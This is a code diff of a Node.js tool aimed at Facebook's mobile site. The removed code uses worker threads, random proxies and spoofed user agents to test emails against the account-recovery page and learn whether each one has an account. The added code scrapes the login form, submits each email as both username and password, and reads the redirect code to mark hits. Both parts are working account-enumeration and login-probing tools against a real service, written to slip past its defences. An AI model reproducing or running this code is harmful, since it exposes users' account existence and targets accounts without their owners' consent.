@@ -1,19 +1,21 @@
-const { parentPort, workerData } = require("worker_threads");
-const axios = require('axios');
 const jsdom = require("jsdom");
 const fs = require('fs');
-const qs = require('querystring')
+const UserAgent = require("./User-Agent");
 const { JSDOM } = jsdom;
-function getRndInteger(min, max) {
-    return Math.floor(Math.random() * (max - min)) + min;
-}
+var request = require('request-promise');
 
 function writeSource(pageSource, email) {
-    // fs.writeFile('index.html', pageSource, function (err, result) {
-    fs.writeFile(process.cwd() + '\\temp\\' + email + '.html', pageSource, function (err, result) {
-        if (err) console.log('error', err);
-    });
+    if (!email) {
+        fs.writeFile('index.html', pageSource, function (err, result) {
+            if (err) console.log('error', err);
+        });
+    } else {
+        fs.writeFile(process.cwd() + '\\temp\\' + email + '.html', pageSource, function (err, result) {
+            if (err) console.log('error', err);
+        });
+    }
 }
+
 function buildCookie(cookie) {
     let result = '';
     for (const iterator of cookie) {
@@ -23,95 +25,87 @@ function buildCookie(cookie) {
     return result;
 }
 
-async function checkAccount(email, proxy, agent) {
-    let document = null;
-    let flag;
-    let cookie = '';
-    await axios({
-        method: 'get',
-        url: 'https://m.facebook.com/login/identify',
+
+async function getLoginPage(userAgent, proxy) {
+    let result = {};
+    const option = {
+        method: 'GET',
+        url: 'https://m.facebook.com/login',
+        timeout: 2000,
         headers: {
             'Host': 'm.facebook.com',
-            'User-Agent': agent
+            'User-Agent': userAgent
         },
-        proxy
-    }).then((response) => {
-        document = new JSDOM(response.data).window.document;
-        cookie = buildCookie(response.headers['set-cookie']);
-    }).then(async () => {
-        const formData = {
-            lsd: document.getElementsByName('lsd')[0].value,
-            jazoest: document.getElementsByName('jazoest')[0].value,
-            did_submit: document.getElementsByName('did_submit')[0].value,
-            email: email
-        }
-        await axios({
-            method: 'post',
-            url: 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=1&alternate_search=0',
-            data: 'lsd=' + formData.lsd + '&jazoest=' + formData.jazoest + '&email=' + formData.email + '&did_submit=' + formData.did_submit,
-            headers: {
-                'Host': 'm.facebook.com',
-                'User-Agent': agent,
-                'Referer': 'https://m.facebook.com/login/identify',
-                'Cookie': cookie,
-            },
-            proxy
-        }).then(async response => {
-            document = new JSDOM(response.data).window.document;
-            // if (!document.getElementById('login_identify_search_error_msg') && document.getElementById('contact_point_selector_form')) {
-            while (!document) { }
-            flag = false;
-            let error = '';
-            try {
-                error = document.querySelector('div[data-sigil="marea"]').textContent;
-            } catch{
-                error = document.querySelector('div span').textContent;
+        resolveWithFullResponse: true
+        // proxy
+    }
+    await request(option)
+        .then((response) => {
+            // writeSource(response.body);
+            const document = new JSDOM(response.body).window.document;
+            const actionForm = document.getElementById('login_form').action;
+            const paramList = document.querySelectorAll('#login_form > input[type="hidden"]');
+            if (paramList && paramList.length !== 0) {
+                result['formData'] = {};
+                for (const iterator of paramList) {
+                    if (!iterator.id) {
+                        result['formData'][iterator.name] = iterator.value;
+                    }
+                }
+                let login = document.querySelector('#login_form button[type="submit"]');
+                if (login) {
+                    result['formData'][login.name] = login.value;
+                }
             }
-            if (!document.getElementById('login_identify_search_error_msg') && document.getElementById('identify_search_text_input')) {
-                // console.log(' Founded : ' + formData.email);
-                writeSource(response.data, email); //debug
-                flag = true;
-            } else {
-                console.log(formData.email + ' error :', error);
+            result['url'] = 'https://m.facebook.com' + actionForm;
+            if (response.headers['set-cookie']) {
+                result['cookie'] = buildCookie(response.headers['set-cookie']);
             }
         });
-    }).catch(error => {
-        // console.log(email + ' connect to proxy ' + proxy.host + ':' + proxy.port + ' Failed', error);
-        flag = "Proxy error";
-    });
-    return flag;
-};
 
-async function checkMail(email, agent, proxy) {
-    return await checkAccount(email, proxy, agent);
+    return result;
+}
+async function postLogin(resultGetLoginPage, userAgent, email, proxy) {
+    let result = { success: false, code: '000000' };
+    const option = {
+        method: 'POST',
+        url: resultGetLoginPage.url,
+        headers: {
+            'Host': 'm.facebook.com',
+            'User-Agent': userAgent,
+            Connection: 'keep-alive',
+            Referer: 'https://m.facebook.com/login'
+        },
+        resolveWithFullResponse: true,
+        formData: resultGetLoginPage.formData
+        // proxy
+    };
+    option.formData['email'] = email;
+    option.formData['pass'] = email;
+    if (resultGetLoginPage.cookie) {
+        option.headers['Cookie'] = resultGetLoginPage.cookie;
+    }
+    await request(option)
+        .catch(function (error) {
+            const resLocation = error.response.headers.location;
+            let start = resLocation.indexOf('&e=') + 3;
+            let end = resLocation.indexOf('&', start);
+            let code = resLocation.slice(start, end);
+            if (code == '1348092') {
+                result = { success: true, code: code };
+            } else {
+                result = { success: false, code: code };
+            }
+        })
+    return result;
+}
+const checkAccount = async (email, proxy) => {
+    const userAgent = UserAgent.getRandomUserAgentMobile();
+    const resultGetLoginPage = await getLoginPage(userAgent);
+    if (resultGetLoginPage.url) {
+        const resulrPostLogin = await postLogin(resultGetLoginPage, userAgent, email);
+        return { email, info: resulrPostLogin };
+    }
 }
 
-async function checking(param, count) {
-    const email = param.email;
-    const agent = param.agent;
-    let check = [];
-    for (let i = 0; i < 5; i++) {
-        const proxy = param.listProxy[getRndInteger(0, param.listProxy.length)];
-        check.push(checkMail(email, agent, proxy));
-        count++;
-    }
-    const result = await Promise.all(check);
-    if (!result.includes(true) && !result.includes(false)) {
-        if (count < 30) {
-            checking(param, count);
-        }
-        else {
-            console.log(email + ' can\'t connect to ' + count + ' proxies');
-            parentPort.postMessage({ email, success: false });
-        }
-    }
-
-    if (result.includes(true)) {
-        parentPort.postMessage({ email, success: true });
-    }
-}
-
-parentPort.on("message", async (param) => {
-    let count = 1;
-    await checking(param, count);
-});
+exports.checkAccount = checkAccount;
